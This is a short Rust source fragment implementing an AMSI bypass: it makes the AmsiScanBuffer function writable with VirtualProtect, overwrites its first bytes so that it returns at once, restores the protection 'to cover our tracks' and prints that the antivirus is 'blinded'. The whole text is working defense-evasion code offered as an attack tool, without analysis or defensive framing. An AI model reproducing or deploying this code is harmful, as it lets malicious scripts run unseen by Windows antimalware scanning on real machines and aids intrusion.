use std::ptr;
use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};

unsafe fn patch_amsi(func_addr: *mut std::ffi::c_void) {
    // x64 Patch: move AMSI_RESULT_CLEAN into EAX, and return.
    // These hex bytes translate to: mov eax, 0x80070057; ret
    let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];

    let mut old_protect = 0;
    // Un-protect the memory so we can overwrite Microsoft's code
    VirtualProtect(func_addr, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);

    // Overwrite the first 6 bytes of AmsiScanBuffer
    ptr::copy_nonoverlapping(patch.as_ptr(), func_addr as *mut u8, patch.len());

    // Restore the original memory protections to cover our tracks
    VirtualProtect(func_addr, patch.len(), old_protect, &mut old_protect);

    println!("[+] AMSI successfully patched. Antivirus is blinded.");
}
